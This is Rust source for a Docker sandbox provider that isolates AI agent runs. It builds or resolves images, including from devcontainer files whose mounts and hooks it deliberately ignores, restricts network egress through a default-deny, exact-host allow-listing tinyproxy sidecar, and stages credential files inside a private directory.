    /// Opt-in memory ceiling, docker `--memory` grammar. `None` ⇒ unbounded.
    memory: Option<String>,
    /// Opt-in CPU ceiling, docker `--cpus` grammar. `None` ⇒ unbounded.
    cpus: Option<String>,
    /// M11 identity/auth channels forwarded into the box (curated identity files,
    /// SSH-agent socket, git identity, scoped auth token). Empty ⇒ pre-M11 argv.
    identity: SandboxIdentity,
}

/// Default docker forward-proxy image for [`EgressMode::Proxy`]/`Strict` egress.
/// A tinyproxy-compatible image: varda mounts a generated tinyproxy config that
/// default-denies and allow-lists exactly the declared egress hosts. Override per
/// sandbox with `egress_proxy_image`.
pub const DEFAULT_EGRESS_PROXY_IMAGE: &str = "vimagick/tinyproxy";

/// In-container port the forward proxy listens on, and its network alias on the
/// internal docker network. The sandbox reaches it via `http://<alias>:<port>`.
const EGRESS_PROXY_PORT: u16 = 8888;
const EGRESS_PROXY_ALIAS: &str = "egress-proxy";

impl DockerProvider {
    /// Attach the M11 identity/auth bundle to a provider (builder). Kept separate
    /// from [`from_config`](Self::from_config) so the many `from_config` call sites
    /// (and tests) stay unchanged; the live run path composes it in `build_client`.
    pub fn with_identity(mut self, identity: SandboxIdentity) -> Self {
        self.identity = identity;
        self
    }

    /// Build a docker provider named `name` from its `[sandboxes.<name>]` entry
    /// and a pre-merged, origin-tagged mount set (see [`merge_mount_origins`]).
    ///
    /// Either `image` or `build` must be supplied; `egress` is threaded through
    /// from the config. The mounts are applied by [`DockerSession`] at wrap time.
    pub fn from_config(
        name: &str,
        config: &SandboxConfig,
        mounts: Vec<(MountOrigin, String)>,
    ) -> Result<Self> {
        let image = config.image.clone().filter(|image| !image.is_empty());
        let build = config.build.clone().filter(|build| !build.is_empty());
        let image_from = config
            .image_from
            .clone()
            .filter(|source| !source.is_empty());
        if image.is_none() && build.is_none() && image_from.is_none() {
            bail!(
                "sandbox '{name}' needs an `image`, a `build` path, or `image_from` (required for the docker provider)"
            );
        }
        Ok(Self {
            name: name.to_owned(),
            image,
            build,
            image_from,
            mounts,
            egress: config.egress.clone(),
            egress_mode: config.egress_mode,
            egress_proxy_image: config
                .egress_proxy_image
                .clone()
                .filter(|image| !image.is_empty())
                .unwrap_or_else(|| DEFAULT_EGRESS_PROXY_IMAGE.to_owned()),
            memory: config.memory.clone().filter(|m| !m.is_empty()),
            cpus: config.cpus.clone().filter(|c| !c.is_empty()),
            identity: SandboxIdentity::default(),
        })
    }

    /// Resolve the concrete image tag to run, in precedence order:
    /// `image_from` (external source, e.g. a devcontainer) → `build` (build the
    /// Dockerfile, content-addressed and cached) → `image` (used verbatim).
    ///
    /// `project_root` is the task's project directory; it anchors devcontainer
    /// discovery (`.devcontainer/devcontainer.json`). Only the image/build is
    /// taken from a devcontainer — never its mounts/runArgs/hooks.
    async fn resolve_image(&self, project_root: &Path) -> Result<String> {
        if let Some(source) = &self.image_from {
            return match source.as_str() {
                "devcontainer" => resolve_devcontainer_image(&self.name, project_root).await,
                other => bail!(
                    "sandbox '{}' has unknown `image_from = \"{other}\"` (expected \"devcontainer\")",
                    self.name
                ),
            };
        }
        if let Some(build) = &self.build {
            return build_image(&self.name, build).await;
        }
        self.image
            .clone()
            .with_context(|| format!("sandbox '{}' has neither image nor build", self.name))
    }

    #[cfg(test)]
    fn new_for_test(name: &str, image: &str, mounts: &[&str], egress: &[&str]) -> Self {
        Self {
            name: name.to_owned(),
            image: Some(image.to_owned()),
            build: None,
            image_from: None,
            mounts: mounts
                .iter()
                .map(|m| (MountOrigin::Sandbox, m.to_string()))
                .collect(),
            egress: egress.iter().map(|e| e.to_string()).collect(),
            egress_mode: EgressMode::DnsPin,
            egress_proxy_image: DEFAULT_EGRESS_PROXY_IMAGE.to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
        }
    }
}

/// Build the Dockerfile at `dockerfile` and return a content-addressed image tag.
///
/// The tag encodes a hash of the Dockerfile's contents, so an unchanged
/// Dockerfile reuses the cached image (we skip the build when the tag already
/// exists locally). The build context is the Dockerfile's parent directory.
async fn build_image(name: &str, dockerfile: &str) -> Result<String> {
    let context_dir = Path::new(dockerfile)
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .map(Path::to_path_buf)
        .unwrap_or_else(|| PathBuf::from("."));
    build_image_with_context(name, Path::new(dockerfile), &context_dir).await
}

/// Build `dockerfile` with an explicit build `context_dir` and return a
/// content-addressed image tag (hash of the Dockerfile contents). Used by
/// [`build_image`] (context = Dockerfile's parent) and the devcontainer source
/// (context taken from `build.context`, which may differ from the Dockerfile's
/// directory).
async fn build_image_with_context(
    name: &str,
    dockerfile: &Path,
    context_dir: &Path,
) -> Result<String> {
    use std::hash::{Hash as _, Hasher as _};

    let dockerfile_str = dockerfile.display().to_string();
    let contents = std::fs::read(dockerfile).with_context(|| {
        format!("failed to read Dockerfile '{dockerfile_str}' for sandbox '{name}'")
    })?;
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    contents.hash(&mut hasher);
    let tag = format!("varda-sandbox:{:016x}", hasher.finish());

    let context_dir = context_dir.to_path_buf();
    let dockerfile = dockerfile_str.clone();

    // Skip the build when an image with this content-addressed tag already exists.
    let exists = tokio::process::Command::new("docker")
        .args(["image", "inspect", &tag])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .await
        .map(|s| s.success())
        .unwrap_or(false);
    if exists {
        return Ok(tag);
    }

    let output = tokio::process::Command::new("docker")
        .arg("build")
        .arg("-q")
        .arg("-t")
        .arg(&tag)
        .arg("-f")
        .arg(dockerfile)
        .arg(&context_dir)
        .output()
        .await
        .with_context(|| format!("failed to spawn `docker build` for sandbox '{name}'"))?;
    if !output.status.success() {
        bail!(
            "`docker build` for sandbox '{name}' failed with status {}; stderr: {}",
            output.status,
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }

    Ok(tag)
}

/// The image/build fields varda takes from a `devcontainer.json`.
///
/// This struct captures ONLY the image-source fields on purpose: a
/// devcontainer.json may also declare `mounts`, `runArgs`, `postCreateCommand`,
/// docker-socket forwarding, etc. — varda deliberately does NOT deserialize
/// those, so they can never leak into the run (the isolation invariant: varda
/// keeps sole control of mounts, egress, and creds). `serde` ignores unknown
/// fields by default, so a hostile devcontainer's extra keys are simply dropped.
#[derive(Debug, Default, serde::Deserialize)]
struct DevcontainerImageSource {
    /// A pre-built image reference (`"image": "busybox"`), used verbatim.
    image: Option<String>,
    /// A build spec (`"build": { "dockerfile": …, "context": … }`).
    build: Option<DevcontainerBuild>,
}

#[derive(Debug, Default, serde::Deserialize)]
struct DevcontainerBuild {
    /// Path to the Dockerfile, relative to the `.devcontainer/` dir. The spec
    /// uses `dockerfile`; older tooling wrote `dockerFile`.
    #[serde(alias = "dockerFile")]
    dockerfile: Option<String>,
    /// Build context, relative to the `.devcontainer/` dir. Defaults to `"."`.
    context: Option<String>,
}

/// Resolve the run image from the project's devcontainer definition (image
/// source `image_from = "devcontainer"`).
///
/// SECURITY: this is an IMAGE SOURCE only. We take the `image` or the
/// `build.dockerfile`/`build.context` and nothing else. Any `mounts`,
/// `runArgs`, docker-socket forwarding, or lifecycle hooks in the
/// devcontainer.json are ignored — varda retains sole control over mounts,
/// egress, and credentials (M2/M3 hardening). The resulting image feeds the
/// SAME DockerProvider run path as a plain `image`/`build` sandbox.
async fn resolve_devcontainer_image(name: &str, project_root: &Path) -> Result<String> {
    let (json_path, base_dir) = discover_devcontainer(project_root).with_context(|| {
        format!(
            "sandbox '{name}' uses `image_from = \"devcontainer\"` but no devcontainer.json was found under {}",
            project_root.display()
        )
    })?;
    let text = std::fs::read_to_string(&json_path).with_context(|| {
        format!(
            "failed to read devcontainer.json at {} for sandbox '{name}'",
            json_path.display()
        )
    })?;
    let source = parse_devcontainer_json(&text).with_context(|| {
        format!(
            "failed to parse devcontainer.json at {} for sandbox '{name}'",
            json_path.display()
        )
    })?;

    // Prefer an explicit image; else build the Dockerfile with its context.
    if let Some(image) = source.image.filter(|i| !i.trim().is_empty()) {
        return Ok(image);
    }
    if let Some(build) = source.build {
        let dockerfile = build.dockerfile.unwrap_or_default();
        if dockerfile.trim().is_empty() {
            bail!(
                "devcontainer.json at {} has a `build` block without a `dockerfile` \
                 (sandbox '{name}' needs an image or a build.dockerfile)",
                json_path.display()
            );
        }
        let dockerfile_path = base_dir.join(&dockerfile);
        let context_dir = base_dir.join(build.context.as_deref().unwrap_or("."));
        return build_image_with_context(name, &dockerfile_path, &context_dir).await;
    }
    bail!(
        "devcontainer.json at {} declares neither an `image` nor a `build.dockerfile` \
         (sandbox '{name}' can only take an image source, not a base-image Feature stack)",
        json_path.display()
    )
}

/// Locate a project's devcontainer definition, returning the JSON file path and
/// the directory build paths are resolved against. Search order matches the
/// devcontainer spec: `.devcontainer/devcontainer.json`, then the top-level
/// `.devcontainer.json`.
fn discover_devcontainer(project_root: &Path) -> Result<(PathBuf, PathBuf)> {
    let nested = project_root.join(".devcontainer").join("devcontainer.json");
    if nested.is_file() {
        let base = nested.parent().map(Path::to_path_buf).unwrap_or_default();
        return Ok((nested, base));
    }
    let top = project_root.join(".devcontainer.json");
    if top.is_file() {
        return Ok((top, project_root.to_path_buf()));
    }
    bail!(
        "no `.devcontainer/devcontainer.json` or `.devcontainer.json` under {}",
        project_root.display()
    )
}

/// Parse a `devcontainer.json`, which is JSONC (JSON with `//` and `/* */`
/// comments and trailing commas). We strip comments/trailing commas and then
/// deserialize only the image-source fields via [`DevcontainerImageSource`].
fn parse_devcontainer_json(text: &str) -> Result<DevcontainerImageSource> {
    let cleaned = strip_jsonc(text);
    let source: DevcontainerImageSource = serde_json::from_str(&cleaned)
        .context("devcontainer.json is not valid JSON (after stripping comments)")?;
    Ok(source)
}

/// Strip JSONC extensions (line/block comments and trailing commas) so the text
/// parses as plain JSON. String contents (including escaped quotes) are
/// preserved verbatim so a `//` or `,` inside a value is never mangled.
fn strip_jsonc(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(text.len());
    let mut i = 0;
    let mut in_string = false;
    let mut escaped = false;
    while i < bytes.len() {
        let c = bytes[i];
        if in_string {
            out.push(c);
            if escaped {
                escaped = false;
            } else if c == b'\\' {
                escaped = true;
            } else if c == b'"' {
                in_string = false;
            }
            i += 1;
            continue;
        }
        match c {
            b'"' => {
                in_string = true;
                out.push(b'"');
                i += 1;
            }
            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'/' => {
                // Line comment: skip to end of line.
                i += 2;
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'*' => {
                // Block comment: skip to closing `*/`.
                i += 2;
                while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                    i += 1;
                }
                i += 2;
            }
            b',' => {
                // Drop a trailing comma: peek past whitespace/comments to the
                // next significant byte; if it closes an object/array, skip it.
                let mut j = i + 1;
                loop {
                    while j < bytes.len() && bytes[j].is_ascii_whitespace() {
                        j += 1;
                    }
                    if j + 1 < bytes.len() && bytes[j] == b'/' && bytes[j + 1] == b'/' {
                        while j < bytes.len() && bytes[j] != b'\n' {
                            j += 1;
                        }
                        continue;
                    }
                    if j + 1 < bytes.len() && bytes[j] == b'/' && bytes[j + 1] == b'*' {
                        j += 2;
                        while j + 1 < bytes.len() && !(bytes[j] == b'*' && bytes[j + 1] == b'/') {
                            j += 1;
                        }
                        j += 2;
                        continue;
                    }
                    break;
                }
                if j < bytes.len() && (bytes[j] == b'}' || bytes[j] == b']') {
                    // Trailing comma before a closer: drop it.
                    i += 1;
                } else {
                    out.push(b',');
                    i += 1;
                }
            }
            _ => {
                out.push(c);
                i += 1;
            }
        }
    }
    // `out` only ever drops whole comment/comma byte spans and copies other
    // bytes verbatim, so multi-byte UTF-8 sequences stay intact.
    String::from_utf8(out).unwrap_or_else(|_| text.to_owned())
}

fn command_on_path(program: &str) -> bool {
    let Some(path) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&path).any(|dir| dir.join(program).is_file())
}

/// Provider backed by the `clawk` CLI. Unlike the old stub, this constructs a
/// real clawk launch when the binary is available, while failing before session
/// construction with the contractually clear error when it is not.
pub struct ClawkProvider {
    name: String,
    image: Option<String>,
    build: Option<String>,
    mounts: Vec<(MountOrigin, String)>,
    egress: Vec<String>,
    identity: SandboxIdentity,
    command_exists: fn(&str) -> bool,
}

impl ClawkProvider {
    pub fn with_identity(mut self, identity: SandboxIdentity) -> Self {
        self.identity = identity;
        self
    }

    pub fn from_config(
        name: &str,
        config: &SandboxConfig,
        mounts: Vec<(MountOrigin, String)>,
    ) -> Result<Self> {
        Ok(Self {
            name: name.to_owned(),
            image: config.image.clone().filter(|image| !image.is_empty()),
            build: config.build.clone().filter(|build| !build.is_empty()),
            mounts,
            egress: config.egress.clone(),
            identity: SandboxIdentity::default(),
            command_exists: command_on_path,
        })
    }

    #[cfg(test)]
    fn with_command_exists(mut self, command_exists: fn(&str) -> bool) -> Self {
        self.command_exists = command_exists;
        self
    }

    async fn resolve_image(&self) -> Result<Option<String>> {
        if let Some(build) = &self.build {
            return Ok(Some(build_image(&self.name, build).await?));
        }
        Ok(self.image.clone())
    }
}

#[async_trait]
impl SandboxProvider for ClawkProvider {
    fn name(&self) -> &str {
        &self.name
    }

    async fn prepare(&self, ctx: &SandboxContext<'_>) -> Result<Box<dyn SandboxSession>> {
        if !(self.command_exists)("clawk") {
            bail!("sandbox primitive 'clawk' requires the clawk CLI on PATH");
        }
        let session_store = varda_sessions_root().join(ctx.session_id);
        std::fs::create_dir_all(&session_store).with_context(|| {
            format!(
                "failed to create sandbox session store {}",
                session_store.display()
            )
        })?;
        let handle = sanitize_docker_name(ctx.session_id);
        Ok(Box::new(ClawkSession {
            image: self.resolve_image().await?,
            project_root: ctx.project_root.to_path_buf(),
            mounts: self.mounts.clone(),
            egress: self.egress.clone(),
            session_store,
            sandbox: format!("varda-sbx-{handle}"),
            home: "/home/agent".to_owned(),
            identity: self.identity.clone(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        }))
    }
}

#[async_trait]
impl SandboxProvider for DockerProvider {
    fn name(&self) -> &str {
        &self.name
    }

    async fn prepare(&self, ctx: &SandboxContext<'_>) -> Result<Box<dyn SandboxSession>> {
        // Non-empty egress is enforced one of two ways. `strict`/`proxy` route the
        // box through an allow-listing forward-proxy sidecar (real enforcement,
        // works with apps that do their own DNS); the raw hostnames go to the proxy
        // filter and NO IPs are pinned. `dns-pin` (legacy) resolves each host to a
        // concrete IP and pins it via `--add-host` while ambient DNS is disabled.
        // `${env:NAME}` in an entry is resolved from the HOST env here, so a wrapper can
        // pin a per-session port (the MCP broker's) without it living in config.
        let egress: Vec<String> = self
            .egress
            .iter()
            .filter_map(|entry| {
                let expanded = expand_egress_entry(entry);
                if expanded.is_none() {
                    eprintln!(
                        "sandbox: egress entry '{entry}' dropped — its ${{env:…}} variable is \
                         unset or empty on the host; anything behind it is unreachable"
                    );
                }
                expanded
            })
            .collect();
        let use_proxy =
            !egress.is_empty() && docker_uses_egress_proxy("docker", self.egress_mode);
        let mut egress_pins = Vec::new();
        let mut egress_hosts = Vec::new();
        if use_proxy {
            egress_hosts = egress.clone();
        } else {
            egress_pins = Vec::with_capacity(egress.len());
            for host in &egress {
                let host = split_egress_host(host).0;
                let ip = resolve_host(host).await.with_context(|| {
                    format!(
                        "failed to resolve egress-allow-listed host '{host}' for sandbox '{}'",
                        self.name
                    )
                })?;
                egress_pins.push((host.to_owned(), ip));
            }
        }
        // Give the container a dedicated HOME backed by a PER-SESSION DOCKER
        // NAMED VOLUME (not a host bind mount). The volume lives in the daemon/VM
        // storage, so it works on a VM-backed daemon whose shared tree excludes
        // `~/.varda` (e.g. a Colima profile sharing only `~/dev`) — a host bind of
        // `~/.varda/sessions/{id}` there silently mounts an empty in-VM stub and
        // the agent's session store never reaches the host. After the run we
        // `docker cp` the store out of the container into `session_store` (a
        // host-side dir we create, never mounted), which resume-capture reads.
        let session_store = varda_sessions_root().join(ctx.session_id);
        std::fs::create_dir_all(&session_store).with_context(|| {
            format!(
                "failed to create sandbox session store {}",
                session_store.display()
            )
        })?;
        let handle = sanitize_docker_name(ctx.session_id);
        // Resolve the concrete image only now: a `build` sandbox builds its
        // Dockerfile here (once, content-addressed) rather than at config load;
        // a devcontainer source discovers `.devcontainer/` under the project root.
        let image = self.resolve_image(ctx.project_root).await?;
        // Proxy egress: stand up the internal network + allow-listing forward proxy
        // BEFORE the sandbox is wrapped/started so its only route out already
        // exists. Teardown removes both (best-effort, idempotent by name).
        if !egress_hosts.is_empty() {
            setup_egress_proxy(
                &handle,
                &egress_hosts,
                &self.egress_proxy_image,
                &session_store,
            )
            .await?;
        }
        Ok(Box::new(DockerSession {
            image,
            project_root: ctx.project_root.to_path_buf(),
            mounts: self.mounts.clone(),
            egress_pins,
            egress_hosts,
            session_store,
            volume: format!("varda-sbx-{handle}"),
            container: format!("varda-sbx-{handle}"),
            home: "/home/agent".to_owned(),
            memory: self.memory.clone(),
            cpus: self.cpus.clone(),
            identity: self.identity.clone(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        }))
    }
}

/// Deterministic per-session names for the forward-proxy sidecar resources, derived
/// from the sandbox handle so [`DockerSession`] can address/tear them down without
/// threading extra state.
fn egress_proxy_network(handle: &str) -> String {
    format!("varda-egnet-{handle}")
}
fn egress_proxy_container(handle: &str) -> String {
    format!("varda-eproxy-{handle}")
}

/// Expand `${env:NAME}` inside an egress entry from the HOST env at prepare time.
///
/// Lets a wrapper pin a per-session port without hardcoding it in config — e.g.
/// `"host.docker.internal:${env:DPT_MCP_PORT}"` follows whatever port the MCP broker
/// came up on. Returns `None` when the variable is unset/empty or the entry is
/// malformed: the entry is then DROPPED rather than allow-listing a literal
/// `${env:...}` host, which would silently never match anything. Only trusted central
/// config declares `egress`, and only host/port text is substituted — nothing crosses
/// into the box.
fn expand_egress_entry(entry: &str) -> Option<String> {
    let mut out = String::with_capacity(entry.len());
    let mut rest = entry;
    while let Some(start) = rest.find("${env:") {
        let (head, tail) = rest.split_at(start);
        out.push_str(head);
        let tail = &tail["${env:".len()..];
        let end = tail.find('}')?;
        let value = std::env::var(&tail[..end]).ok().filter(|v| !v.is_empty())?;
        out.push_str(&value);
        rest = &tail[end + 1..];
    }
    out.push_str(rest);
    Some(out)
}

/// Split an egress entry into its host and optional explicit port (`host[:port]`).
///
/// A bare `example.com` is HTTPS-shaped and needs nothing beyond the default CONNECT
/// ports. An entry like `host.docker.internal:8765` additionally opens CONNECT to that
/// port, which a plain-`http://` client still needs: undici's `ProxyAgent` (Node's
/// fetch, hence every Node MCP client) CONNECT-tunnels through a forward proxy
/// REGARDLESS of scheme, so an http service on a non-default port is unreachable
/// until its port is allowed. The host half is what the filter matches — tinyproxy
/// filters on host only, never host:port.
fn split_egress_host(entry: &str) -> (&str, Option<&str>) {
    match entry.rsplit_once(':') {
        Some((host, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => {
            (host, Some(port))
        }
        _ => (entry, None),
    }
}

/// Build the tinyproxy config that default-denies and allow-lists exactly `hosts`.
/// `FilterDefaultDeny Yes` + a per-host anchored regex means a non-allow-listed
/// CONNECT/GET is refused at the proxy — real enforcement, not just DNS breakage.
/// The regex is exact-host only (`^host$`): declaring `api.anthropic.com` allows
/// ONLY that host, never a subdomain (`evil.api.anthropic.com`) or a suffix-match
/// impostor (`api.anthropic.com.evil.com`).
fn tinyproxy_filter(hosts: &[String]) -> String {
    let mut seen = std::collections::BTreeSet::new();
    hosts
        .iter()
        .map(|h| split_egress_host(h).0)
        .filter(|h| seen.insert(h.to_owned()))
        .map(|h| format!("^{}$", h.replace('.', "\\.")))
        .collect::<Vec<_>>()
        .join("\n")
        + "\n"
}

fn tinyproxy_conf(hosts: &[String]) -> String {
    // 443/563 are the defaults every HTTPS client needs; anything else must be opted
    // into per host via an explicit `host:port` egress entry.
    let mut ports: std::collections::BTreeSet<&str> = ["443", "563"].into_iter().collect();
    for host in hosts {
        if let (_, Some(port)) = split_egress_host(host) {
            ports.insert(port);
        }
    }
    let connect_ports = ports
        .iter()
        .map(|p| format!("ConnectPort {p}\n"))
        .collect::<String>();
    format!(
        "Port {EGRESS_PROXY_PORT}\n\
         Listen 0.0.0.0\n\
         Timeout 600\n\
         Allow 0.0.0.0/0\n\
         {connect_ports}\
         FilterExtended On\n\
         FilterCaseSensitive Off\n\
         FilterDefaultDeny Yes\n\
         Filter \"/etc/varda-proxy/filter\"\n"
    )
}

/// Stand up the allow-listing forward-proxy sidecar for `hosts`:
/// 1. an `--internal` docker network (no route to the internet) the sandbox joins;
/// 2. the proxy container on that network (alias [`EGRESS_PROXY_ALIAS`]) with the
///    generated tinyproxy config COPIED IN (`docker cp`, not bind-mounted);
/// 3. the proxy ALSO connected to the default `bridge` so IT — and only it — can
///    reach the allow-listed hosts on the sandbox's behalf.
///
/// The config is `docker cp`-ed rather than bind-mounted for the same reason the
/// agent HOME is a named volume: it lives under `~/.varda`, which a VM-backed daemon
/// (e.g. a Colima profile sharing only `~/dev`) does NOT share. A host bind of it
/// silently mounts an EMPTY in-VM stub, tinyproxy exits with "Could not open config
/// file", and the sandbox — whose only route out is that proxy — loses ALL egress
/// while looking like a network fault. `docker cp` streams over the daemon API and
/// is independent of what the VM shares.
///
/// Idempotent by name: re-running `network create`/`run` for an existing resource
/// is tolerated. Best-effort mirror in [`DockerSession::teardown`].
async fn setup_egress_proxy(
    handle: &str,
    hosts: &[String],
    image: &str,
    session_store: &Path,
) -> Result<()> {
    let network = egress_proxy_network(handle);
    let container = egress_proxy_container(handle);
    // 1. Internal network: containers on it have NO default route to the internet.
    let out = tokio::process::Command::new("docker")
        .args(["network", "create", "--internal", &network])
        .output()
        .await
        .with_context(|| format!("failed to spawn `docker network create {network}`"))?;
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        if !stderr.contains("already exists") {
            bail!("`docker network create --internal {network}` failed; stderr: {stderr}");
        }
    }
    // 2. Write the proxy config + filter into a host dir mounted read-only into the
    //    proxy. Lives under the session store so it is cleaned with the session.
    let cfg_dir = session_store.join("egress-proxy");
    std::fs::create_dir_all(&cfg_dir)
        .with_context(|| format!("failed to create proxy config dir {}", cfg_dir.display()))?;
    std::fs::write(cfg_dir.join("tinyproxy.conf"), tinyproxy_conf(hosts))
        .with_context(|| "failed to write tinyproxy.conf".to_string())?;
    std::fs::write(cfg_dir.join("filter"), tinyproxy_filter(hosts))
        .with_context(|| "failed to write proxy filter".to_string())?;
    // 2a. CREATE (not run) the proxy so the config can be copied in before it starts.
    let out = tokio::process::Command::new("docker")
        .args([
            "create",
            "--rm",
            "--name",
            &container,
            "--network",
            &network,
            "--network-alias",
            EGRESS_PROXY_ALIAS,
            image,
            "tinyproxy",
            "-d",
            "-c",
            "/etc/varda-proxy/tinyproxy.conf",
        ])
        .output()
        .await
        .with_context(|| format!("failed to spawn proxy container `{container}`"))?;
    if !out.status.success() {
        bail!(
            "`docker create` for egress proxy '{container}' (image '{image}') failed; stderr: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    // 2b. Copy the config+filter INTO the created container (daemon API stream — works
    //     on a VM-backed daemon that does not share `~/.varda`; a bind mount does not).
    let cp_dest = format!("{container}:/etc/varda-proxy");
    let out = tokio::process::Command::new("docker")
        .args(["cp", &cfg_dir.display().to_string(), &cp_dest])
        .output()
        .await
        .with_context(|| format!("failed to copy proxy config into `{container}`"))?;
    if !out.status.success() {
        bail!(
            "`docker cp` of the egress-proxy config into '{container}' failed; stderr: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    // 3. Give the proxy — and only the proxy — a route to the internet.
    let out = tokio::process::Command::new("docker")
        .args(["network", "connect", "bridge", &container])
        .output()
        .await
        .with_context(|| format!("failed to connect proxy '{container}' to bridge"))?;
    if !out.status.success() {
        bail!(
            "`docker network connect bridge {container}` failed; stderr: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    // 4. Start it now that the config is in place and both networks are attached.
    let out = tokio::process::Command::new("docker")
        .args(["start", &container])
        .output()
        .await
        .with_context(|| format!("failed to start proxy container `{container}`"))?;
    if !out.status.success() {
        bail!(
            "`docker start` for egress proxy '{container}' failed; stderr: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    // The sandbox's ONLY route out is this proxy, so a proxy that exits immediately
    // (bad config, missing filter) would surface as an opaque "network fetch failed"
    // inside the box. Assert it is actually running before handing the box its route.
    let out = tokio::process::Command::new("docker")
        .args(["inspect", "-f", "{{.State.Running}}", &container])
        .output()
        .await
        .with_context(|| format!("failed to inspect proxy container `{container}`"))?;
    if String::from_utf8_lossy(&out.stdout).trim() != "true" {
        let logs = tokio::process::Command::new("docker")
            .args(["logs", "--tail", "20", &container])
            .output()
            .await
            .map(|o| {
                format!(
                    "{}{}",
                    String::from_utf8_lossy(&o.stdout),
                    String::from_utf8_lossy(&o.stderr)
                )
            })
            .unwrap_or_default();
        bail!(
            "egress proxy '{container}' exited immediately after start; the sandbox would have              NO working egress. Proxy logs: {}",
            logs.trim()
        );
    }
    Ok(())
}

/// Host directory under which per-session sandbox HOME dirs are created.
///
/// Mirrors `acp::default_varda_home`: honours `VARDA_HOME`, else `$HOME/.varda`,
/// then appends `sessions`.
fn varda_sessions_root() -> PathBuf {
    let base = std::env::var_os("VARDA_HOME")
        .filter(|value| !value.is_empty())
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|home| Path::new(&home).join(".varda")))
        .unwrap_or_else(|| PathBuf::from(".varda"));
    base.join("sessions")
}

/// Deterministic-per-content filename suffix for a staged temp file. Avoids
/// `rand`/time (unavailable in some contexts) while keeping distinct contents in
/// distinct files: a short FNV-1a hash of the content.
fn staged_temp_suffix(content: &str) -> String {
    let mut hash: u64 = 0xcbf29ce484222325;
    for byte in content.as_bytes() {
        hash ^= *byte as u64;
        hash = hash.wrapping_mul(0x00000100000001B3);
    }
    format!("{hash:016x}")
}

/// Write `content` to a fresh host temp for staging into the guest. When
/// `read_only` is set the temp is created `0o400` FROM CREATION TIME (not
/// write-then-chmod, which would briefly expose a world-readable credential
/// under a normal umask) so a staged credential VALUE (M11-ext file target) is
/// never left mutable OR world-readable on the host and — since `docker cp` /
/// `msb --copy-file` preserve the source mode — lands read-only in the guest.
/// The prompt uses the default (world-readable) perms so a non-root agent can
/// still read it. Returns the host temp path.
fn write_stage_temp(content: &str, read_only: bool) -> Result<PathBuf> {
    let tmp = std::env::temp_dir().join(format!("varda-stage-{}", staged_temp_suffix(content)));
    // The filename is content-addressed, so a prior run staging the SAME value may
    // have left a temp here (a read-only `0o400` credential temp `std::fs::write`
    // cannot truncate, or an attacker-planted file). Clear it first (best-effort)
    // so the credential create below owns a FRESH inode.
    let _ = std::fs::remove_file(&tmp);
    #[cfg(unix)]
    if read_only {
        use std::io::Write as _;
        use std::os::unix::fs::OpenOptionsExt as _;
        // Credential VALUE: create the file `0o400` FROM CREATION TIME. Writing
        // with `std::fs::write` then chmod-ing `0o400` afterward leaves a brief
        // window where the file exists world-readable (`0o644` under a normal
        // umask) on the host — a credential must never be exposed that way.
        // `create_new` additionally refuses a pre-existing file, so we never write
        // the credential into an attacker-planted inode (belt to the remove above).
        use std::os::unix::fs::PermissionsExt as _;
        // The guest agent is NOT root and NOT the host uid (it runs as uid 1001),
        // and `--copy-file` preserves the source mode — so a `0o400` credential
        // staged by the host user is unreadable inside the box and the wrapper dies
        // with "cannot open ... Permission denied" before the agent starts.
        //
        // Protect the credential with a PRIVATE DIRECTORY instead of an unreadable
        // file: `<varda_home>/stage` is created `0o700`, so no other local user can
        // traverse into it, while the file itself stays readable to whoever can get
        // there — which in the guest is the agent. #627's actual property is
        // unchanged: the secret never appears on the argv, only its guest path does.
        let dir = crate::config::varda_home()?.join("stage");
        std::fs::create_dir_all(&dir)
            .with_context(|| format!("failed to create credential stage dir {}", dir.display()))?;
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).with_context(
            || format!("failed to lock down credential stage dir {}", dir.display()),
        )?;
        let tmp = dir.join(
            tmp.file_name()
                .expect("staged temp path always has a file name"),
        );
        let _ = std::fs::remove_file(&tmp);
        let mut file = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o444)
            .open(&tmp)
            .with_context(|| format!("failed to stage file {}", tmp.display()))?;
        file.write_all(content.as_bytes())
            .with_context(|| format!("failed to write staged file {}", tmp.display()))?;
        // `create_new`'s mode is masked by the umask; force exactly `0o444` so the
        // guest agent can read it regardless of the host process umask.
        std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o444))
            .with_context(|| format!("failed to set perms on {}", tmp.display()))?;
        return Ok(tmp);
    }
    // Prompt / non-credential: default (umask) perms so a non-root guest agent can
    // still read the file after `docker cp`/`--copy-file` preserves the source mode.
    std::fs::write(&tmp, content)
        .with_context(|| format!("failed to stage file {}", tmp.display()))?;
    Ok(tmp)
}

/// Sanitize a session id into a docker-safe name/volume component.
///
/// Docker names must match `[a-zA-Z0-9][a-zA-Z0-9_.-]*`; every other character
/// is folded to `-`. The `varda-sbx-` prefix guarantees a valid leading char, so
/// the result is always usable even for an empty or exotic session id.
fn sanitize_docker_name(session_id: &str) -> String {
    session_id
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '_' || c == '.' || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect()
}

/// Stable provider resource handle derived from a Varda session id.
pub(crate) fn sanitize_session_handle(session_id: &str) -> String {
    sanitize_docker_name(session_id)
}

/// Resolve `host` to a single IP address using the host's blocking resolver.
///
